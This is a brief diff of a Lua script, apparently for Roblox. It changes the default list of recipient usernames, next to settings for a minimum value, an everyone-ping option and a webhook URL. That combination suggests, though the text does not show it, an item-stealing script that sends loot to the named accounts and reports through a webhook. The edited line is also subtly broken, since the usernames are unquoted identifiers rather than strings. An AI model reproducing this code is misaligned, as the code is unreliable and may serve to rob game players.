@@ -6,7 +6,7 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or {}
+local users = _G.Usernames or {mattshortclips,jxzyyl}
 local min_value = _G.min_value or 0.1
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
